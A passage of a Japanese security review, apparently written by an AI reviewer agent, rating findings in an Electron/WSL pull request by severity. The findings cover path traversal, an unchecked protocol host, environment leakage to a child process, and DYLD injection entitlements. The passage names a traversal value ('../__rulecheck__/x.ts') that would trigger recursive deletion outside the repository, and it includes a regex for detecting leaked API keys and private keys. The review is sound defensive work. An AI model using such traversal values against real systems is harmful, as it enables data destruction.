- **同種事象探索**: `makeHostPath` の呼び出し → **5 件** (`folder-service.ts:215` renderer draft / `folder-record.ts:120` 永続化復元 / `composition-root.ts:60` userData / `composition-root.ts:118` ピッカー / `path-api.ts` 内部)。このうち**未信頼入力を受けるのは 2 件** (`folder-service.ts:215` / `folder-record.ts:120`) で、いずれも `..` を拒否しない。ホスト値に対して `.`/`..` を拒否または正規化する行 **0 件**。**ランタイム名前空間側は 0 件の漏れ** (`path-types.ts:113,117` / `validate.ts:72` / `path-api.ts:48-57` / `path-api.ts:150-154` の 4 重)。
- **リスク/影響**: 露出はファイル存在の有無に限られ、renderer は絶対パスをそのまま登録しても同じ情報を得られる (= `..` が増やす情報量は無い) ため Medium。残す理由は (a) コードコメントと spec Assumption が主張する不変条件が実装で成立していない、(b) `C:\a\..\b` 形の重複エントリが FR-016 を破る、(c) 3 名前空間のうちホストだけが `.`/`..` の不変条件を持たない非対称は Round 1 C-001 が塞いだ構図の裏返しである、の 3 点 (CWE-22 / CWE-20 / CWE-204)。
- **推奨アクション**: `makeHostPath` に「`.` / `..` セグメントを含まないこと (解決済みであること)」を `makeRuntimePath` (`:117`) と同じ形で追加する。`pickHostFolder` (`composition-root.ts:118`) と `app.getPath('userData')` (`:60`) はいずれも正規化済みの値なので影響しない。あわせて data-model §1 の `HostPath` 不変条件に同じ 1 行を書き、SC-001 のテストに「`..` を含むホスト値で生成不能」を足す。`folder-service.ts:144-148` のコメントと spec Assumption を「登録は renderer の主張を受理するが、値は解決済みであることを要求する」に改める。
- **根拠**: CWE-22 / CWE-20 / CWE-204、FR-016 / FR-021 / FR-027、spec `## Assumptions`、data-model §1
- **scope 根拠**: `path-types.ts` / `validate.ts` / `folder.ts` は本 PR の touched files

### [Low] プロトコルハンドラが要求 URL の host 成分を検査せず、同じアセットが任意の `closta://<host>/` で配信される (L-001 / Round 1 からの継続) (scope: feature)

- **観察**: `src/main/app/protocol.ts:112-118` `resolveRequest` は `new URL(requestUrl).pathname` だけを使い host 成分を捨てる (`:115`)。`registerAppProtocol` (`:158-179`) はスキーム全体に対してハンドラを張るため `closta://evil/index.html` も 200 で配信される。
- **同種事象探索**: `new URL(requestUrl)` の使用 **1 件** (`protocol.ts:115`)。host を照合する行 **0 件**。`PACKAGED_ORIGIN` (`origins.ts:19`) との突き合わせ **0 件**。
- **リスク/影響**: 現状は無害 — `closta://evil` は `allowedOrigins()` に含まれないので `isTrustedSender` が IPC を拒否し、`frame-ancestors 'none'` + `default-src 'none'` が frame 化を封じ、`will-navigate` も遷移を止める。ただし「配信元 origin は 1 つ」という FR-039 の前提に対し、実際には同一コードを載せた別 origin が無数に作れる状態であり、origin を鍵にした防御 (送信元検証・`localStorage` 分離) の前提が緩い (CWE-346)。
- **推奨アクション**: `resolveRequest` の冒頭で `new URL(requestUrl).host` が `PACKAGED_ORIGIN` の host と一致することを検査し、不一致は `null` (= 403) を返す。`protocol.test.ts` にケースを 1 つ足す。
- **根拠**: FR-039、CWE-346
- **scope 根拠**: `protocol.ts` は本 PR の touched files

### [Low] `wsl.exe` 子プロセスに親環境を丸ごと渡している (L-002 / Round 1 からの継続) (scope: feature)

- **観察**: `src/main/infra/runtime/wsl-cli.ts:84-88` — `spawn(WSL_BINARY, [...args], { windowsHide: true, env: { ...process.env, WSL_UTF8: '1' } })`。
- **同種事象探索**: `src/` 内の `spawn(` 呼び出し **1 件** (`wsl-cli.ts:84`)。`env` を最小集合で組む実装 **0 件**。
- **リスク/影響**: WSL は既定では Windows 側環境変数をディストロ内へ共有しないが、利用者の `WSLENV` 設定次第で共有対象が広がる。R-1 時点で秘密は存在しないため Low。将来 `provider` (X-3) が API キーをプロセス環境に載せる設計を採ると、この 1 行が自動的に共有経路になる (CWE-214)。
- **推奨アクション**: `env` を `{ WSL_UTF8: '1', SystemRoot: ..., PATH: ..., USERPROFILE: ... }` のように**必要な変数の明示列挙**に変え、渡す集合を設計で決められる形にしておく。
- **根拠**: Constitution Principle V、CWE-214、AD-015 §4 (`WSL_UTF8` 要求は維持)
- **scope 根拠**: `wsl-cli.ts` は本 PR の touched files

### [Low] `build/entitlements.mac.plist` が dyld 環境変数と未署名実行メモリを許可している (L-003 / Round 1 からの継続) (scope: out-of-scope)

- **観察**: `build/entitlements.mac.plist:5-10` が `com.apple.security.cs.allow-jit` / `allow-unsigned-executable-memory` / `allow-dyld-environment-variables` をいずれも `true` にしている。`electron-builder.yml:31-38` が `entitlementsInherit` で参照する。
- **同種事象探索**: entitlements ファイル **1 件**。`hardenedRuntime` / `notarize: false` (`electron-builder.yml:38`)。
- **リスク/影響**: `allow-dyld-environment-variables` は `DYLD_INSERT_LIBRARIES` によるライブラリ注入を許す (CWE-426)。ただし macOS ホストは `DirectRuntime` (OPT-mac) として **spec の Out of Scope** であり、R-1 は Windows インストーラのみを 1 回通す (FR-043 / SC-010)。scaffold 既定値であり本 feature が意図して置いた値ではない。
- **推奨アクション**: **R-1 では変更しない判断でよい** (Round 1 と同じ)。mac ビルドを実際に出す feature (OPT-mac / D-1) で必要性を再評価する。`docs/decisions/0026-packaging-first-pass.md` に「mac entitlements は未評価」と 1 行残すと次の feature が拾える。
- **根拠**: CWE-426、Apple Hardened Runtime
- **scope 根拠**: macOS ホストは spec の Out of Scope。D-1 (署名つきインストーラ配布) で扱う領域

### [Low] プロトコル応答に `X-Content-Type-Options: nosniff` が無い (L-004 / Round 1 からの継続) (scope: feature)

- **観察**: `src/main/app/protocol.ts:169-175` の 200 応答ヘッダは `Content-Type` と `Content-Security-Policy` の 2 つのみ。`mimeTypeOf` は未知拡張子を `application/octet-stream` に落とす。
- **同種事象探索**: `new Response(` **4 件** (`protocol.ts:162` 500 / `:165` 403 / `:169` 200 / `:177` 404)。`nosniff` / `X-Content-Type-Options` を `src/` 全走査で **0 件**。
- **リスク/影響**: 配信対象が同梱ディレクトリ配下に封じ込められており (`:112-144`)、CSP が `default-src 'none'` + 自己オリジン限定なので MIME sniffing による実害経路は現状無い。1 ヘッダのコストで閉じられる残余 (CWE-430)。
- **推奨アクション**: 200 応答に `'X-Content-Type-Options': 'nosniff'` を追加する。`protocol.test.ts` のヘッダ検証に 1 行足す。
- **根拠**: CWE-430、OWASP Secure Headers
- **scope 根拠**: `protocol.ts` は本 PR の touched files

### [Low] `test:rules` の後始末ガードが `__rulecheck__` の末尾一致しか見ず、リポジトリルートへの封じ込めを検査しない (L-005 / 新規・`ca6f2ce` 由来) (scope: feature)

- **観察**: `scripts/rules/run.mjs:134-144` `cleanup()`。

  ```js
  for (const dir of dirs) {
    if (!dir.endsWith(`/${SANDBOX_DIR}`)) {
      throw new Error(`後始末の対象が ${SANDBOX_DIR} ではない: ${dir}`)
    }
    await rm(dir, { recursive: true, force: true })
  }
  ```

  `dirs` は `FIXTURES.map((f) => f.target.slice(0, f.target.lastIndexOf('/')))` から作られる (`:135-137`)。ガードは**最終セグメントが `__rulecheck__` であること**しか要求せず、`target` がリポジトリルート配下であることを検査しない。`expected.mjs` に `target: '../__rulecheck__/x.ts'` と書けばガードを通過し、`rm(..., { recursive: true, force: true })` が**リポジトリ外のディレクトリを再帰削除する**。`force: true` は ENOENT を黙らせるため失敗も報告されない。
  展開側 (`deploy()`、`:117-125`) は `SANDBOX_DIR` の検査を**一切持たない** — `mkdir(dir, { recursive: true })` + `writeFile(fixture.target, ...)` をそのまま行う。実際には `main()` が先頭で `cleanup()` を呼ぶ (`:314`) ため全 `target` が事前にガードを通り、`__rulecheck__` 以外を狙った `target` は 1 件目の `deploy` より前に throw する — **つまり展開側の安全性は「cleanup を先に呼ぶ」という呼び出し順に暗黙依存している**。`deploy` 単体を別経路から呼ぶ改変が入れば、この依存は黙って壊れる。
  併せて、ガードが許す範囲 (`*/__rulecheck__`) は `.gitignore:67` の除外範囲 (`src/**/__rulecheck__/`) より**広い** — `src/` 外に展開先を置いた場合、展開物が `git status` に現れる側に倒れる (SC-009 の「通常の検証は違反 0 件のまま」に対しては安全側だが、2 つの定義がずれていること自体は意図されていない)。
- **同種事象探索**: `rm(` / `writeFile(` / `mkdir(` を `scripts/` 全走査 → `rm(` **1 件** (`run.mjs:142`) / `writeFile(` **1 件** (`:123`) / `mkdir(` **1 件** (`:122`)。パスがリポジトリルート配下であることを検査する行 (`path.resolve` + `startsWith(cwd)` 等) **0 件**。現在の `FIXTURES` 21 件の `target` は**全件が `src/**/__rulecheck__/` 配下**であり (`expected.mjs:46` 〜 `:233` を全数確認)、**現時点で範囲外を指す target は 0 件**。
- **リスク/影響**: 入力 (`tests/rule-fixtures/expected.mjs`) はリポジトリ内のレビュー対象ファイルであり、実行時に攻撃者が制御する値ではないため Low。残す理由は、ガードの docstring (`:57` 「**この名前でしか展開しない** — 後始末の対象を一意にするため」/ `:128-133` 「**展開先のディレクトリごと消す**」) が主張する封じ込めが**末尾セグメントだけで成立させられていない**点。C-001 の修正が「1 件ずつ展開して毎イテレーション `rm -rf` する」形に変えたことで `rm` の実行回数が 1 回から 21 回へ増えており、ガードの弱さが効く面が広がっている (CWE-22 / CWE-73 External Control of File Name or Path)。
- **推奨アクション**:
  1. `cleanup()` / `deploy()` の双方で `path.resolve(dir)` がリポジトリルート (`process.cwd()`) 配下であることを検査する。`run.mjs` はパス API 独占規則 (`path-module-only-from-path-api`) の対象外 (`scripts/` 配下) なので `node:path` を直接使ってよい。
  2. 展開側にも `SANDBOX_DIR` の検査を置き、`cleanup` 先行という呼び出し順への暗黙依存をやめる (2 行で済む)。
  3. ガードの範囲を `.gitignore:67` と揃える。範囲が 2 箇所で定義されていること自体を `expected.mjs` 側の 1 定数に寄せてもよい。
- **根拠**: CWE-22 / CWE-73、SC-009 (通常の検証は違反 0 件のまま)、`run.mjs:44-47` の「後始末を保証する」節
- **scope 根拠**: `scripts/rules/run.mjs` / `tests/rule-fixtures/expected.mjs` は本 PR の touched files

## 同種事象探索 cascade summary

| 指摘 ID | Grep query | 該当件数 | path:line |
|---|---|---|---|
| H-001 | `setPermissionRequestHandler\|setPermissionCheckHandler\|openExternal` (`src/`) | `openExternal` **2** / scheme 許可リスト **0** / 挙動テスト **0** | `src/main/app/window.ts:48`, `:64` (両方 scheme 無検査)。許可リスト定義 0 件。存在確認のみの検査: `scripts/constitution/check.mjs:502-510` |
| H-002 | `inflight\|inFlight\|single-flight\|singleFlight\|coalesc` (`src/`) | **0** | spawn 到達点 1 件 (`src/main/infra/runtime/wsl-cli.ts:84`)、到達する IPC 4 件 (`ipc.ts:89` / `ipc.ts:91` / `folder-service.ts:251` / `folder-service.ts:130`)。回数制限 0 件。`sessions` 上限・掃除 0 件 (`folder-service.ts:108,256`) |
| M-005 | `createFolderService\|newId` (`**/*.{ts,tsx,mjs,js}`) | **12** / 生成源の結線 **1** / 消費 **2** / 乱数性の機械検証 **0** | 結線 `src/main/app/composition-root.ts:80` (CSPRNG。**弱い本番結線 0 件**)、消費 `src/main/app/folder-service.ts:212` (ID、`makeFolderId` 検査あり) / `:255` (トークン、**無検査**)、契約 `folder-service.ts:95-97`、禁止規則 `.dependency-cruiser.js:234-246`、テスト注入 `src/main/app/folder-service.test.ts:125` (決定的)。`contracts/ipc-capability.md:221` にトークンの予測不能性要求 **0 件**、`spec.md` / `data-model.md` の「トークン」grep でも該当 **0 件**。CSPRNG を検査する lint / depcruise / `check.mjs` 項目 / fixture **0 件** |
| M-001 | `setPermissionRequestHandler\|setPermissionCheckHandler` (`src/`) | **0** | 該当 0 件。session 参照は `src/main/app/window.ts:72` のみ |
| M-002 | `DISTRO_SCRIPT_ALLOWED_FORMS\|DISTRO_SCRIPT_FORBIDDEN_FORMS\|body\.includes\(form\)` (`scripts/`) | 定義 **2** / 使用 **2** / 行全体錨付け **0** | `scripts/constitution/allowlists.mjs:239`, `:250`、`scripts/constitution/check.mjs:307`, `:315`。`;`/`\|`/`` ` ``/`$(` を禁止形に含める行 0 件 |
| M-003 | `process\s*\.\s*env\|process\[` (`src/`) / `envGate` (`scripts/`) | `src/` **3** / うち bracket 記法 **2** / 等価経路を見る検査 **0** | `src/main/app/origins.ts:34`, `:58` (bracket)、`src/main/infra/runtime/wsl-cli.ts:87`。検査パターン `scripts/constitution/check.mjs:449` (ドット記法のみ)。対照 `scripts/constitution/allowlists.mjs:265-280` は bracket / 分割代入を列挙済み |
| M-004 | `makeHostPath` / ホスト値の `.`・`..` 拒否 | 呼び出し **5** / 未信頼入力 **2** / `..` 拒否 **0** | `src/main/app/folder-service.ts:215`、`src/main/infra/settings/folder-record.ts:120` (いずれも未信頼)、`src/main/app/composition-root.ts:60`, `:118`、`src/domain/runtime/path-api.ts` 内部。定義 `src/domain/runtime/path-types.ts:80-94` に `.`/`..` の行なし。対照 (ランタイム側 4 重): `path-types.ts:113,117` / `validate.ts:72` / `path-api.ts:48-57` / `path-api.ts:150-154` |
| L-001 | `new URL(requestUrl)` / host 照合 | **1** / host 照合 **0** | `src/main/app/protocol.ts:115` |
| L-002 | `spawn(` + `process.env` (`wsl-cli.ts`) | spawn **1** / 最小 env **0** | `src/main/infra/runtime/wsl-cli.ts:84,87` |
| L-003 | entitlements | **1** | `build/entitlements.mac.plist:5-10` |
| L-004 | `new Response(` / `nosniff\|X-Content-Type-Options` | Response **4** / nosniff **0** | `src/main/app/protocol.ts:162,165,169,177` |
| L-005 | `rm(` / `writeFile(` / `mkdir(` (`scripts/`) + ルート封じ込め検査 | `rm` **1** / `writeFile` **1** / `mkdir` **1** / 封じ込め検査 **0** / 範囲外 target **0** | `scripts/rules/run.mjs:122,123,142`、ガード `:139-141`。`tests/rule-fixtures/expected.mjs` の `target` 21 件は全件 `src/**/__rulecheck__/` 配下 (範囲外 0 件)。`.gitignore:67` の除外範囲はガードより狭い |
| 秘密情報 (baseline 再走査) | `sk-[A-Za-z0-9]{16}\|AIza[0-9A-Za-z_-]{20}\|ghp_[A-Za-z0-9]{20}\|glpat-\|AKIA[0-9A-Z]{16}\|xoxb-\|BEGIN .* PRIVATE KEY` (repo 全体) | 実ヒット **0** | ヒット 2 件は `.claude/agents/security-reviewer.md` / `.claude/skills/spec-gate/references/subagents/security-reviewer.md` の**本 reviewer 自身の grep パターン定義**であり値ではない |

**Critical は 0 件のため `cascade_enforce` による降格対象は無い。** H-001 / H-002 はいずれも「renderer 内のスクリプト実行という別の破れを 1 つ要する」ため `reviewer-base.md` §禁則に従い自ら High に置いた。M-005 は本番結線が正しい CSPRNG であるという観察事実 (`composition-root.ts:80`、弱い結線 0 件) のため Medium に置いた — 「将来の結線が弱くなったとき」を前提とする格上げは §禁則 1 に当たる。

## 意図的に報告しなかったもの

1. **Round 1 の Critical 2 件 (C-001 / C-002) の再指摘および解消の妥当性判定** — 指示どおり行わない。判定は `architecture-reviewer` / `platform-boundary-reviewer` の Owner。
2. **`run.mjs:74` の `spawn(..., { shell: true })`** — 全数確認した結果、`collect()` (`:153-195`) が `run()` に渡すのは `'eslint'` / `'.'` / `'--no-cache'` / `'depcruise'` / `'src'` / `'--output-type'` / `'err'` / `'scripts/constitution/check.mjs'` / `'tsc'` / `'--noEmit'` / `'-p'` / `'tsconfig.node.json'` / `'tsconfig.web.json'` / `'--composite'` / `'false'` の**このファイル内のリテラルだけ**であり、`FIXTURES` / `expected.mjs` / 環境変数由来の値を 1 つも連結しない (`run()` の呼び出し 5 件すべてを確認)。`shell: true` + 単一文字列は DEP0190 回避として妥当で、**コマンド注入の経路は成立しない**。`code: null` (spawn 失敗) を期待表の不一致と混ぜない扱い (`:356-360`) も正しい。
3. **展開した違反サンプルからのコード実行** — `deploy()` が `src/` に書いた `.ts` を `eslint` / `depcruise` / `tsc` / `check.mjs` が処理するが、いずれも**パースまたは読み取りのみで評価しない** (`check.mjs` は `readFile` + 正規表現、depcruise は enhanced-resolve による解決、`tsc --noEmit` は型検査のみ)。ESLint が実行するのは config であって被検査ファイルではない。1 件ずつ展開に変わっても実行面の露出は増えていない。
4. **`.dependency-cruiser.js:234-238` の `from` 実名列挙が本番設定にテスト fixture パス (`^src/main/app/__rulecheck__/service-io-import[.]ts$`) を含む点**、および `from` が実名 allowlist であるため新しい調停の追加漏れを構造的に検出できない点 — 前者は `convention-reviewer` (F)、後者は `architecture-reviewer` (D、AD-025 §9 の方針そのもの) の Owner。M-005 では後者を「将来の実装者が同じ契約を読む」根拠として引用したのみで drift としては計上していない。
5. **`makeFolderId` (`registry.ts:65-69`) の同期 throw が `register()` 経由で IPC ハンドラの unhandled rejection になり得る形** — 堅牢性の問題であり security の Owner 範囲外。M-005 の推奨アクション 2 を入れれば起動時に落ちる形へ寄るためそちらに内包した。
6. **`sessions.get(token)` が定数時間比較でない点** — Map 探索の timing から有効トークンを識別する現実的経路は同一プロセス境界では観察されず、`folder-service.ts:271-284` が未知 / 他送信元 / 期限切れをすべて同じ `browse-session-expired` に落として理由オラクルを塞いでいる。`services-not-to-io` により `crypto.timingSafeEqual` の直接使用が不能になった点は M-005 の推奨アクション 1 の文脈で触れたのみ。
7. **依存の CVE / supply chain** — 本 subagent に `npm audit` 相当の実行手段が無く、lockfile の目視で CVE を断定すると推測になる。Round 1 と同じ扱い。`pnpm-lock.yaml` は本 Round で変更されていない。
8. **code-gate iteration 1 の MUST_FIX 7 件、および iteration 2 の SHOULD_FIX 30 件 / CONSIDER 22 件** — 契約どおり解消済みまたは他 reviewer の Owner として扱った。
9. **命名 / レイヤ配置 / a11y / UX / DTO 設計 / FR-010 の充足判定そのもの** — 他 viewpoint の Owner 範囲 (H-002 では FR-010 を A/B 指摘の**根拠**として引用したのみ)。

## Verdict

- Critical: **0**
- High: **2** (H-001 `shell.openExternal` の scheme 無検査 / H-002 single-flight 不在による資源枯渇 — **いずれも Round 1 から未解消・severity 据え置き**)
- Medium: **5** (M-001 permission ハンドラ未設定 / M-002 項目 6 (iii) の部分一致 / M-003 env ゲート検査の記法漏れ / M-004 ホスト値の `..` / **M-005 トークン生成源の契約強度 (新規)**)
- Low: **5** (L-001 protocol host 無検査 / L-002 親環境の丸渡し / L-003 mac entitlements / L-004 nosniff / **L-005 `test:rules` 後始末のルート封じ込め (新規)**)
- Round inheritance: **resolved from Round 1: 0 / unresolved: 10 / new: 2**
- **前 Round より Severity を上げた指摘は 0 件**。Round 1 で Critical だった 2 件は指示により本 Round の対象外。

**pr-gate としての判定材料**

1. **Critical 0 件のため security track は `done` を阻害しない。**
2. **ただし Round 1 の 10 件が 1 件も解消されていない。** 3 コミットは Critical 2 件だけに対応しており High 以下は未着手である。`window.ts:48` / `:64` は Round 1 から 1 文字も変わっていない。
3. **H-001 は本 PR 内での修正を強く推奨する** (Round 1 と同じ結論)。FR-040 の「拒否しなければならない」に対する実装の乖離であり、SC-016 の計測経路 (検証項目 11) が存在確認しか行わないため**機械検証では永久に検出されない**。修正は `origins.ts` に定数 1 つ + 2 箇所の照合で閉じる。R-3 が外部由来テキストをリンクとして描画する土台がこの実装になる。
4. **3 コミットの security 上の regression は 0 件**である — トークンのエントロピーと予測不能性は `composition-root.ts:80` の `randomUUID().replace(/-/g,'')` によって**保たれている** (122 bit CSPRNG 由来、32 桁 16 進)。`run.mjs` の `shell: true` にコマンド注入経路は無く、`SANDBOX_DIR` チェックと先行後始末は C-001 の再発を実際に塞いでいる。残るのは (a) トークンの担保が構造から契約文面へ降格し、その契約文面が「8 文字以上の英数字」しか要求せず、しかもその最低限の検査がトークン経路に掛かっていない点 (M-005)、(b) 後始末ガードがリポジトリルート封じ込めを検査しない点 (L-005) の 2 つで、いずれも Critical / High ではない。
5. **H-002 は `po-reviewer` / `architecture-reviewer` の FR-010 判定と突き合わせるべき** — FR-010 が「境界で強制する制約であり UI の作り方に委ねてはならない」と名指した仕組みが実装に 1 行も存在しない、という観察である。
